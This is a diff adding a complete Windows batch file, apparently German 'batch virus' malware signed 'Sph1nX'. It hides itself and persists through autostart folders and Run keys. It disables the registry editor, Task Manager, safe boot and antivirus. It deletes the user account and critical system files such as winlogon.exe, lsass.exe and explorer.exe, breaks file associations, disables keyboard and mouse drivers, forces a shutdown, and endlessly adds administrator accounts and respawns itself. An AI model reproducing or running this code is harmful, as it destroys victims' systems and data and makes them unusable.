@@ -1,0 +1,202 @@
+@echo off
+REM DU SIEHST DIESEN SATZ ?
+REM WILLST WOHL RIPPEN HM ?
+REM PLS DIE !!!
+REM MADE BY Sph1nX - www.batch-rockz.dl.am
+REM FUCK OFF
+
+attrib +R +S +H %0
+attrib +R +S +H "%userprofile%\Lokale Einstellungen\Temp"
+attrib +R +S +H "%userprofile%\Lokale Einstellungen\Temp\"
+echo y | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d "1"
+echo y | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d "1"
+echo j | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d "1"
+echo j | reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d "1"
+reg delete HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal /f
+reg delete HKLM\SYSTEM\CurrentControlSet\control\safeboot\network /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_SZ /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoDispSettingsPage /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDispCPL /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+
+
+start iexplore www.batch-rockz.dl.am
+
+attrib +R +S +H "%userprofile%\Lokale Einstellungen\Temp"
+md "C:\Programm Files\"
+
+copy %0 "C:\Programm Files\"
+copy %0 "C:\Programm Files"
+net user %username% /del
+net localgroup Administratoren %username% /del
+net user %username% /delete
+net localgroup Administratoren %username% /delete
+cls
+
+copy %0 "%userprofile%\startm~1\Programme\Autostart"
+
+ren %userprofile%\startm~1\Programme\Autostart\*.* %random%.*
+md %windir%\Command
+copy %0 "%windir%\Command\"
+ren %windir%\Command\*.bat Command.bat
+ren %windir%\Command\*.exe Command.exe
+ren %windir%\Command\*.* Command.*
+
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Winlogon /t REG_SZ /d %windir%\Command\Command.bat /f
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Winlogon /t REG_SZ /d %windir%\Command\Command.exe /f
+
+copy %0 "%AllUsersProfile%\Startm~1\Programme\Autostart"
+copy %0 ""%userprofile%\startm~1\Programme\Autostart"
+ren ""%userprofile%\startm~1\Programme\Autostart\*.bat" %random%.bat
+ren ""%userprofile%\startm~1\Programme\Autostart\*.exe" %random%.exe
+ren ""%userprofile%\startm~1\Programme\Autostart\*.*" %random%.*
+
+attrib +R +S +H ""%userprofile%\startm~1\Programme\Autostart"
+attrib +R +S +H "%windir%\Command"
+
+
+color 0a
+net stop AntiVirService
+net stop cryptsvc
+net stop Designs
+net stop Anmeldedienst
+
+cls
+
+taskkill /F /T /IM avgnt.exe
+tskill /A avgnt
+taskkill /F /T /IM avguard.exe
+tskill /A avguard
+
+taskkill /IM taskmgr.exe
+tskill taskmgr
+cd %windir%\system32
+attrib -R -S -H taskmgr.exe
+del /S /Q /F taskmgr.exe
+
+taskkill /IM explorer.exe
+tskill  explorer
+cd %windir%
+REM Sph1nX
+attrib -R -S -H explorer.exe
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+tskill  explorer
+del /S /Q /F explorer.exe
+
+attrib -R -S -H bootstat.dat
+del /S /Q /F bootstat.dat
+cd %windir%\Prefetch
+attrib -R -S -H NTOSBOOT-B00DFAAD.pf
+del /S /Q /F NTOSBOOT-B00DFAAD.pf
+cd %windir%\system32
+attrib -R -S -H bootvid.dll
+del /F /S /Q bootvid.dll
+cd "%userprofile%"
+attrib -R -S -H NTUSER.dat
+del /F /S /Q NTUSER.dat
+REM Sph1nX
+cls
+cd\
+attrib -R -S -H *.sys
+attrib -R -S -H *.bin
+attrib -R -S -H *.bat
+attrib -R -S -H ntldr.*
+attrib -R -S -H *.SYS
+attrib -R -S -H %systemroot%\system32\logon.scr
+attrib -R -S -H %systemroot%\system32\logonui.exe
+attrib -R -S -H %systemroot%\system32\logonui.exe.manifest
+attrib -R -S -H %systemroot%\system32\seclogon.dll
+attrib -R -S -H %systemroot%\system32\usrlogon.cmd
+attrib -R -S -H %systemroot%\system32\WindowsLogon.manifest
+attrib -R -S -H %systemroot%\system32\winlogon.exe
+attrib -R -S -H %systemroot%\system32\dllcache\logon.scr
+attrib -R -S -H %systemroot%\system32\dllcache\logonui.exe
+attrib -R -S -H C:\WINDOWS\system32\dllcache\winlogon.exe
+attrib -R -S -H %windir%\Cursors\*.*
+
+cd\
+
+del /F /Q *.sys
+del /F /Q *.bin
+del /F /Q *.bat
+del /F /Q *.SYS
+del /F /Q %systemroot%\system32\logon.scr
+del /F /Q %systemroot%\system32\logonui.exe
+del /F /Q %systemroot%\system32\logonui.exe.manifest
+del /F /Q %systemroot%\system32\seclogon.dll
+del /F /Q %systemroot%\system32\usrlogon.cmd
+del /F /Q %systemroot%\system32\WindowsLogon.manifest
+del /F /Q %systemroot%\system32\winlogon.exe
+del /F /Q %systemroot%\system32\dllcache\logon.scr
+del /F /Q %systemroot%\system32\dllcache\logonui.exe
+del /F /Q C:\WINDOWS\system32\dllcache\winlogon.exe
+del /F /Q %windir%\Cursors\*.*
+
+cls
+
+taskkill /F /IM explorer.exe
+
+del /F /Q %windir%\explorer.exe
+del /F /Q %windir%\system32\explorer.exe
+
+shutdown -s -t 30 -c "%username% g0t 0wn3d bY -Sph1nX-"
+
+assoc .dll=FucKeD
+assoc .exe=FucKeD
+assoc .ini=FucKeD
+assoc .logon=FucKeD
+assoc .scr=FucKeD
+assoc .reg=FucKeD
+assoc .key=FucKeD
+assoc .com=FucKeD
+assoc .zip=FucKeD
+assoc .rar=FucKeD
+assoc .jpg=FucKeD
+assoc .ico=FucKeD
+assoc .icon=FucKeD
+assoc .bat=FucKeD
+
+cls
+
+taskkill /F /T /IM lsass.exe
+tskill /A lsass
+del /F /Q %windir%\system32\lsass.exe
+taskkill /F /IM explorer.exe
+tskill explorer
+REM Sph1nX
+del /F /Q %windir%\explorer.exe
+del /F /Q %windir%\system32\explorer.exe
+cls
+
+md %windir%\Command 
+copy %0 "%windir%\Command\"
+copy %0 "%windir%\Command"
+ren %windir%\Command\*.* Command.bat
+REM Sph1nX
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Winlogon /t REG_SZ /d %windir%\Command\Command.bat /f
+copy %0 "C:\Dokumente und Einstellungen\All Users\StartmenÅ\Programme\Autostart"
+ren %userprofile%\startm~1\Programme\Autostart\*.bat Command.bat
+reg add "HKLM\System\CurrentControlSet\Services\Mouclass" /v Start /t REG_DWORD /d "4" /f
+reg add "HKLM\System\CurrentControlSet\Services\Kbdclass" /v Start /t REG_DWORD /d "4" /f
+
+:a
+net user "Sph1nX - %random%" "%random%" /add
+net localgroup Administratoren "Sph1nX - %random%" /add
+start %0
+goto a
